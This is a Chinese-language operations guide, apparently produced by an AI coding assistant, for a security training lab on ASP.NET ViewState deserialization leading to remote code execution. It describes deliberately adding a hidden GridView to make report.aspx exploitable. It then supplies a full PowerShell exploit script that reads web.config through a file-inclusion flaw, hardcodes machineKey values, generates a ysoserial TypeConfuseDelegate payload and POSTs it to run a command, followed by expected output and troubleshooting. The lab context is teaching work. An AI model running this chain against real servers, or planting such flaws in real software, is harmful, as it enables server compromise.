# 🚀 立即操作指南

## 已完成的工作

✅ **代码修复**
- 修改了 report.aspx，添加了隐藏的 GridView 控件
- GridView 会在 ViewState 中保存复杂对象
- ASP.NET 框架在 postback 时会反序列化这些对象
- 这将触发 gadget chain 并执行远程代码

✅ **已提交到 GitHub**
- `report.aspx` 修复
- `WINSERVER_DEPLOYMENT_GUIDE.md` - 详细部署指南
- `RCE_VERIFICATION_CHECKLIST.md` - 完整验证清单

---

## 你现在需要在 Windows Server 上做什么

### 步骤 1：更新代码（2 分钟）

```powershell
cd "C:\Users\user\Desktop\AIS3_IIS_ASP.NET_Deserialization2RCE"
git pull origin main
```

### 步骤 2：复制文件到 IIS（1 分钟）

```powershell
Copy-Item "website\*" -Destination "C:\inetpub\wwwroot\VulnerableApp\" -Force
```

### 步骤 3：重启 IIS（1 分钟）

```powershell
iisreset /restart
Start-Sleep -Seconds 2
```

### 步骤 4：运行完整测试脚本（5 分钟）

**保存以下代码为 `C:\test_full_rce.ps1`：**

```powershell
# ========== 完整 RCE 测试脚本 ==========

Write-Host "════════════════════════════════════════════════"
Write-Host "      ASP.NET ViewState RCE 完整测试"
Write-Host "════════════════════════════════════════════════"
Write-Host ""

# ===== 验证修改 =====
Write-Host "【步骤 1】验证代码修改"
Write-Host "───────────────────────────────────────────────"
$response = Invoke-WebRequest -Uri "http://10.41.53.120/report.aspx" -UseBasicParsing
if ($response.Content -match '__VIEWSTATE" value="([^"]+)"') {
    $viewstate = $matches[1]
    Write-Host "✅ report.aspx 状态: HTTP $($response.StatusCode)"
    Write-Host "   __VIEWSTATE 长度: $($viewstate.Length) 字符"
    if ($viewstate.Length -gt 150) {
        Write-Host "   ✅ ViewState 长度正确（GridView 已加载）"
    } else {
        Write-Host "   ⚠️ ViewState 长度可能不足（$($viewstate.Length) < 150）"
    }
}

# 检查 GridView
if ($response.Content -match "gvHiddenData") {
    Write-Host "✅ GridView 已正确添加"
} else {
    Write-Host "❌ GridView 未找到！"
}

Write-Host ""

# ===== 验证 LFI =====
Write-Host "【步骤 2】验证 LFI 漏洞"
Write-Host "───────────────────────────────────────────────"
$lfi_response = Invoke-WebRequest -Uri "http://10.41.53.120/download.aspx?file=C:\inetpub\wwwroot\VulnerableApp\web.config" -UseBasicParsing -ErrorAction SilentlyContinue
if ($lfi_response.Content -match "machineKey") {
    Write-Host "✅ LFI 工作正常，能读取 web.config"
} else {
    Write-Host "❌ LFI 失败"
}

Write-Host ""

# ===== 生成 Payload =====
Write-Host "【步骤 3】生成恶意 Payload"
Write-Host "───────────────────────────────────────────────"
$ysoserial = "C:\Users\user\Downloads\ysoserial-new\Release\ysoserial.exe"
$payloadFile = "$env:TEMP\rce_payload.bin"

if (Test-Path $ysoserial) {
    $validationKey = "719B829E1103FBAAFC74A4083971E6022F15407E693470E498CCBD6D7BE489FE"
    $decryptionKey = "E64C06018DC70BAE2DB204040F6489E5EAA06C82E4F46EDF671F55DB4C517A64"
    $command = 'cmd /c whoami > C:\inetpub\wwwroot\VulnerableApp\pwned.txt'

    & $ysoserial -f LosFormatter -g TypeConfuseDelegate -c $command `
      --validationkey $validationKey --validationalg HMACSHA256 `
      --decryptionkey $decryptionKey --decryptionalg AES > $payloadFile

    $payloadBinary = [System.IO.File]::ReadAllBytes($payloadFile)
    $payloadBase64 = [System.Convert]::ToBase64String($payloadBinary)
    
    Write-Host "✅ Payload 生成成功"
    Write-Host "   大小: $($payloadBinary.Length) 字节"
    Write-Host "   Base64: $($payloadBase64.Length) 字符"
} else {
    Write-Host "❌ ysoserial.exe 未找到"
    exit 1
}

Write-Host ""

# ===== 删除旧的 pwned.txt =====
Write-Host "【步骤 4】清理测试环境"
Write-Host "───────────────────────────────────────────────"
$pwnedPath = "C:\inetpub\wwwroot\VulnerableApp\pwned.txt"
if (Test-Path $pwnedPath) {
    rm $pwnedPath
    Write-Host "✅ 旧的 pwned.txt 已删除"
}

Write-Host ""

# ===== 发送 RCE =====
Write-Host "【步骤 5】发送恶意 ViewState (RCE 触发)"
Write-Host "───────────────────────────────────────────────"
$body = @{
    "__VIEWSTATE" = $payloadBase64
    "txtReportName" = "exploit"
    "txtReportDate" = "2024-01-01"
}

Invoke-WebRequest -Uri "http://10.41.53.120/report.aspx" `
    -Method POST `
    -Body $body `
    -ErrorAction SilentlyContinue | Out-Null

Write-Host "✅ POST 请求已发送"
Write-Host "   等待命令执行..."
Start-Sleep -Seconds 3

Write-Host ""

# ===== 验证 RCE =====
Write-Host "【步骤 6】验证 RCE 是否成功"
Write-Host "───────────────────────────────────────────────"

if (Test-Path $pwnedPath) {
    Write-Host "🎉🎉🎉 RCE 成功！"
    Write-Host ""
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    Write-Host "pwned.txt 内容："
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    Get-Content $pwnedPath
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    Write-Host ""
    Write-Host "✅ 两阶段 RCE 攻击链完全验证成功！"
} else {
    Write-Host "❌ pwned.txt 未创建"
    Write-Host "   路径: $pwnedPath"
    Write-Host ""
    Write-Host "故障排查："
    Write-Host "1. 检查 __VIEWSTATE 长度是否足够"
    Write-Host "2. 检查 GridView 是否正确加载"
    Write-Host "3. 清除 IIS 缓存后重试"
    Write-Host "   rm 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\*' -Recurse -Force"
}

Write-Host ""
Write-Host "════════════════════════════════════════════════"
```

**运行测试：**

```powershell
powershell -ExecutionPolicy Bypass -File C:\test_full_rce.ps1
```

---

## ✅ 预期的成功输出

```
════════════════════════════════════════════════
      ASP.NET ViewState RCE 完整测试
════════════════════════════════════════════════

【步骤 1】验证代码修改
───────────────────────────────────────────────
✅ report.aspx 状态: HTTP 200
   __VIEWSTATE 长度: 250+ 字符
   ✅ ViewState 长度正确（GridView 已加载）
✅ GridView 已正确添加

【步骤 2】验证 LFI 漏洞
───────────────────────────────────────────────
✅ LFI 工作正常，能读取 web.config

【步骤 3】生成恶意 Payload
───────────────────────────────────────────────
✅ Payload 生成成功
   大小: 2000+ 字节
   Base64: 3000+ 字符

【步骤 4】清理测试环境
───────────────────────────────────────────────
✅ 旧的 pwned.txt 已删除

【步骤 5】发送恶意 ViewState (RCE 触发)
───────────────────────────────────────────────
✅ POST 请求已发送
   等待命令执行...

【步骤 6】验证 RCE 是否成功
───────────────────────────────────────────────
🎉🎉🎉 RCE 成功！

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
pwned.txt 内容：
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
IISAPPPOOL\VULNERABLEAPPPOOL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ 两阶段 RCE 攻击链完全验证成功！

════════════════════════════════════════════════
```

---

## 如果测试失败？

### ❌ 场景 1：pwned.txt 未创建

**检查清单：**
1. __VIEWSTATE 长度是否 > 150 字符？
   ```powershell
   # 如果不足，GridView 可能未加载
   # 解决：清除 IIS 缓存并重启
   rm "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\*" -Recurse -Force
   iisreset /restart
   ```

2. GridView 是否在页面中？
   ```powershell
   Get-Content "C:\inetpub\wwwroot\VulnerableApp\report.aspx" | Select-String "GridView"
   ```

3. 权限问题？
   ```powershell
   icacls "C:\inetpub\wwwroot\VulnerableApp"
   ```

### ❌ 场景 2：report.aspx 返回 Runtime Error

**解决：**
```powershell
# 清除编译缓存
rm "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\*" -Recurse -Force

# 重启 IIS
iisreset /restart

# 等待编译
Start-Sleep -Seconds 30

# 再次访问
Invoke-WebRequest "http://10.41.53.120/report.aspx"
```

---

## 📚 参考文档

已推送到 GitHub 的详细文档：

1. **WINSERVER_DEPLOYMENT_GUIDE.md**
   - 逐步部署指南
   - 完整的 PowerShell 命令
   - 故障排查步骤

2. **RCE_VERIFICATION_CHECKLIST.md**
   - 详细的验证清单
   - 每个步骤的预期输出
   - 多次测试计划

3. **README.md**
   - 项目概述和教学价值
   - 完整的攻击流程说明

---

## 🎯 验收标准

| 项目 | 状态 |
|------|------|
| ✅ 代码修改已完成 | ✓ |
| ✅ 已提交到 GitHub | ✓ |
| 🔲 代码已更新（git pull） | 待执行 |
| 🔲 文件已复制到 IIS | 待执行 |
| 🔲 IIS 已重启 | 待执行 |
| 🔲 __VIEWSTATE 长度已增加 | 待验证 |
| 🔲 LFI 仍然工作 | 待验证 |
| 🔲 Payload 已生成 | 待执行 |
| **🔲 pwned.txt 已创建** | **待验证** |

---

## 最后

**一切代码修改已完成并提交到 GitHub！** ✅

现在需要你在 Windows Server 上：

1. **git pull** 获取最新代码
2. **复制文件** 到 IIS
3. **重启 IIS** 应用池
4. **运行测试脚本** 验证 RCE

**预期结果：** pwned.txt 应该被创建，显示 IIS App Pool 的身份

---

**祝你成功！如有问题，参考 WINSERVER_DEPLOYMENT_GUIDE.md 的故障排查部分。** 🚀
